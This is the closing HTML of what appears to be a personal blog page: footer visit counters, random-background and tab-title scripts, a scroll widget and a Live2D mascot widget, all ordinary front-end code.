                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 4;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 天黑了~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":0.5,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script></body>
</html>